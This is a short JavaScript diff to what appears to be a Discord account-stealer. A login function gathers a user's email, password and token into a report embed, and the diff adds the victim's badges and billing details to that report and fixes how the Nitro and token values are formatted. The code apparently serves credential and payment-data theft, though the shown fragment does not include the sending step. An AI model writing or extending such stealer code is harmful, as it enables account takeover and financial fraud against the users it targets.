@@ -675,13 +675,23 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
+            name: '**Badges**',
+            value: `\`${badges}\``,
+            inline: true,
+          },
+          {
+            name: '**Billing**',
+            value: `\`${billing}\``,
+            inline: true,
+          },
+          {
             name: '**Nitro**',
-            value: `\`{nitro}\``,
+            value: `\`${nitro}\``,
             inline: false,
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `\```${token}```\``,
             inline: false,
           },
         ],
